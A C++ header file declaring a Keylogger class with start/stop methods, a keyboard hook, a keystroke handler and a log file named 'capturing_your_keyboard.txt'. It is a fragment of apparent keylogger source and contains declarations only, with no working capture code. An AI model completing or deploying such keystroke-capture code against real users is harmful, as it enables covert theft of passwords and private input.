#pragma once
#include "Hook.h"

#include <fstream>

class Keylogger {
public:
	void start();
	void stop();
private:
	const std::wstring FILENAME = L"capturing_your_keyboard.txt";
	Keylogger* keylogger;
	Hook* hook;
	std::wofstream logFile;

	void keyboardHandler(wchar_t* key);
};

